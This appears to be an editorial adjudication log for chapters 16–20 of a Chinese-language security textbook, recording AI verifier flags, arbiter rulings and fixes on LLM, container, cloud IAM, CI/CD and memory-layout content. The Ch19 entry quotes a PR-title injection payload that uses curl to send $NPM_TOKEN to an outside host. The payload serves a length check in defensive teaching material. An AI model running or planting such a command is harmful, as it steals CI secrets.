# P4 Adjudication & Bridging Review Log — Slice 4 (Ch16–Ch20)

## [2026-11-21] ch16-ai-and-agent-security.md — fixed
claim: 本章對齊 OWASP Top 10 for Large Language Model Applications（2025），涵蓋 LLM01 Prompt Injection、LLM02 Sensitive Information Disclosure 與 LLM06 Excessive Agency。
book value: OWASP Top 10 for Large Language Model Applications（2025）含 LLM01、LLM02、LLM06  verifier value: source-evidence 僅確認 LLM01 與 LLM06，無 2025 年份與 LLM02 編號佐證  flagging families: google (agy:gemini-4-argon-low)
arbiter: agrees=true conf=high — 延伸閱讀條目加上未在 source-evidence 明列的（2025）與 LLM02 編號，改為直接對齊 LLM01 Prompt Injection、敏感資訊外洩與 LLM06 Excessive Agency。
tiebreak: n/a
action: 移除延伸閱讀中未佐證的（2025）年份與 LLM02 編號標示，對齊 source-evidence。

## [2026-11-21] ch16-ai-and-agent-security.md — dismissed
claim: 動手做章節列出 PortSwigger Web Security Academy 的『Web LLM attacks』主題下 4 個實戰關卡名稱與難度級別。
book value: 列出 4 個 PortSwigger Web LLM attacks 實戰關卡與思維提示  verifier value: source-evidence 未逐一列出關卡名稱（imprecise）  flagging families: google (agy:gemini-4-argon-low)
arbiter: agrees=false conf=high — 此為 style-guide 與 outline 明確要求之外部靶場檢查點（Pitfall #12 闭卷面板對未錄入 source-evidence 之外部靶場清單標為 imprecise），屬正常教學引導且無事實錯誤。
tiebreak: anthropic/book_correct
action: dismissed-with-concurrence

## [2026-11-21] ch16-ai-and-agent-security.md — bridging-review: pass
declared_bridge: none
detected_bridges: []
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch17-containers-and-kubernetes.md — fixed
claim: 容器隔離四機制、橋接成立邊界、cgroups v1 release_agent 觸發條件、CAP_SYS_ADMIN / CAP_DAC_READ_SEARCH / CAP_BPF / seccomp RuntimeDefault / hostPID 條件、RBAC secrets/get 與 bind 生效範圍、5×4 權限圖最短 3 步提權前提（SelfSubjectRulesReview POST 與節點憑證分佈）、PSS Restricted 允許 Localhost seccomp、capabilities.drop 與無特權系統呼叫描述、restricted 下透過 pods/create 竊取同 Namespace Secret 之傳回條件，以及撤銷 SA Token 自動掛載需重建既有 Pod。
book value: 原文部分條件敘述省略了網路政策／命名空間前提、notify_on_release=1、POST selfsubjectrulesreviews、Localhost seccomp 及 pods/log 授權差異  verifier value: 補足各項核心機制、RBAC 動詞邊界、5×4 提權圖節點前提與 PSS Restricted 規範細節  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 逐項核對 Linux namespaces/cgroups/capabilities/seccomp 與 Kubernetes RBAC/PSA 規範，補齊所有必要成立前提並修正 HTTP 方法（POST selfsubjectrulesreviews）與 Localhost seccomp 描述。
tiebreak: n/a
action: 全面修訂 Ch17 橋接成立邊界、Linux 四大隔離原語條件、RBAC 提權原語、5×4 Worked Example 前提與 API 方法、PSS Restricted 規範描述及自我檢核解答。

## [2026-11-21] ch17-containers-and-kubernetes.md — bridging-review: pass
declared_bridge: Linux 行程模型與容器 `chroot`/Namespace → 核心隔離逃逸邊界
detected_bridges: ["Linux 行程模型與容器 chroot/Namespace → 核心隔離逃逸邊界（錨點、成立邊界、失效邊界完整）"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch18-cloud-iam-and-lateral-movement.md — fixed
claim: SSRF/工作負載失守取證前提、憑證匯出外部使用之網路條件限制、IMDSv1 單次/兩次 GET 與 IMDSv2 Hop Limit=2 影響範圍、IAM 策略交集閘門與同帳號 Resource Policy / KMS Key Policy 委派規則、Confused Deputy ExternalId 與 UpdateAssumeRolePolicy / UpdateFunctionCode 前提、S3 Block Public Access 四子項機制與 SigV4 X-Amz-Expires 參數名、CloudTrail 無獨立 iam:PassRole 事件、Permissions Boundary 需包含部署動作與顯式拒絕生產資源、LocalStack 與 mock_imds.py 模擬範圍說明。
book value: 原文將 iam:PassRole 列為 CloudTrail 獨立事件、Permissions Boundary 範例未納入 lambda:CreateFunction/PassRole Allow 與生產資源 Explicit Deny、SigV4 參數寫為 Expires  verifier value: 修正 CloudTrail 事件描述、補齊 Permissions Boundary JSON 的部署 Allow 與生產資源 Explicit Deny、改用 X-Amz-Expires 並精確化 IAM 評估與實驗說明  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 獨立重算 IAM 策略交集：若 Permissions Boundary 未包含 lambda:CreateFunction 與 iam:PassRole，部署角色在交集下會連正常部署都被拒絕；且 iam:PassRole 是授權檢查而非獨立 CloudTrail 事件，必須修正。
tiebreak: n/a
action: 修訂 Ch18 IMDSv1/v2 條件、IAM 評估交集與 KMS 規則、S3 Block Public Access 與 X-Amz-Expires、移除 CloudTrail 獨立 iam:PassRole 範例、補齊 Permissions Boundary JSON 並精確標註 LocalStack 與 mock_imds 實驗模擬範圍。

## [2026-11-21] ch18-cloud-iam-and-lateral-movement.md — bridging-review: pass
declared_bridge: none
detected_bridges: []
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch19-supply-chain-and-cicd.md — fixed
claim: CI/CD DAG 橋接成立邊界（可重現與 Provenance 可稽核性）、Dependency Confusion 版本範圍條件（99.0.0 vs ^1.4.2 內之 1.99.0）、package-lock.json resolved/integrity 條件、cargo check / rust-analyzer 執行條件、pull_request vs pull_request_target 預設秘密與權限表、45 字元 PR 標題展開後位元組數（10 + 45 + 1 = 56 bytes，原誤寫 60 bytes）、OIDC JWT 簽章（JWS 明文宣告而非加密宣告）與 AWS IAM sub/job_workflow_ref 比對方式、SLSA L3 控制平面隔離、Sigstore/Cosign 簽章驗證與 workflow 範例補上 cosign sign 步驟、Lab 任務一標題與描述對齊。
book value: Worked Example 展開結果寫為 60 bytes、OIDC JWT 寫為「加密身分宣告」、Cosign workflow 僅列 installer 未列 cosign sign 命令  verifier value: `echo "PR: ` (10B) + payload (45B) + `"` (1B) = 56 bytes；OIDC JWT 為數位簽章（JWS）而非加密；補齊 cosign sign 步驟與各項條件  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 驗算 `echo "PR: x"; curl -s -d "$NPM_TOKEN" https://x.io/c; #"` 長度確為 10 + 45 + 1 = 56 bytes；JWT 為 JWS 簽章；AWS IAM OIDC 預設條件鍵為 sub 與 aud，若比對 workflow 應透過自訂 sub 範本納入。
tiebreak: n/a
action: 修正 Ch19 Worked Example 56 bytes 長度算式、修正 OIDC JWS 簽章與自訂 sub 說明、補上 workflow 範例之 cosign sign 步驟，並收緊 Dependency Confusion、Lockfile、SLSA L3 與 Lab 描述。

## [2026-11-21] ch19-supply-chain-and-cicd.md — bridging-review: pass
declared_bridge: CI/CD 建置管線 DAG → 供應鏈信任傳遞與投毒點
detected_bridges: ["CI/CD 建置管線 DAG → 供應鏈信任傳遞與投毒點（錨點、成立邊界、失效邊界完整）"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch20-binary-and-memory-layout.md — fixed
claim: 頁表橋接成立與失效邊界（堆疊與 .got.plt 分屬不同映射）、ELF PT_DYNAMIC 與 DT_SYMTAB/DT_STRTAB、Canonical Address LA57 bit 56 符號擴展與 #GP/#SS 例外、Callee-saved 保存原則與堆疊調整對齊、ARM64 使用者態 EL0 堆疊對齊控制位元 SCTLR_EL1.SA0（原誤寫 SA）、28-bit ASLR 無重複線性猜測期望值 (N+1)/2 = 134,217,728.5 次與崩潰次數模型區分、低 12 bits 固定僅適用於頁對齊映像符號（stack 局部變數有次頁級偏移）、Stack Canary 返回前偵測與 off-by-one 洩漏條件、Partial/Full RELRO 驗證旗標、nexus_parse.c 處理 len=0 時初始化 local_copy 避免未初始化讀取。
book value: ARM64 EL0 堆疊對齊寫為 SCTLR_EL1.SA、線性猜測期望值寫為 N/2、nexus_parse.c 在 len=0 時讀取未初始化的 local_copy[0]  verifier value: EL0 由 SCTLR_EL1.SA0 控制（SA 為 EL1）、含命中當次之無重複期望為 (N+1)/2 = 134,217,728.5 次、nexus_parse.c 應初始化 local_copy 並處理 preview == 0  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — ARMv8-A 規範中 SCTLR_EL1.SA0 控制 EL0 SP 對齊檢查；離散均勻分布 {1..N} 期望值為 (N+1)/2 = 134,217,728.5；且 C 基準程式在 len=0 時確實會讀取未初始化之 local_copy[0]，應初始化為 0 並加上 preview > 0 判斷。
tiebreak: n/a
action: 修正 Ch20 SCTLR_EL1.SA0、LA57 bit 56、ASLR 期望值 (N+1)/2、區分映射符號與 stack 之低 12 bits 行為、修正 nexus_parse.c 零長度負載處理，以及精確化 ELF/RELRO/Canary 描述。

## [2026-11-21] ch20-binary-and-memory-layout.md — bridging-review: pass
declared_bridge: 作業系統虛擬記憶體頁表 → ELF 與 64 位元行程位址空間
detected_bridges: ["作業系統虛擬記憶體頁表 → ELF 與 64 位元行程位址空間（錨點、成立邊界、失效邊界完整）"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass
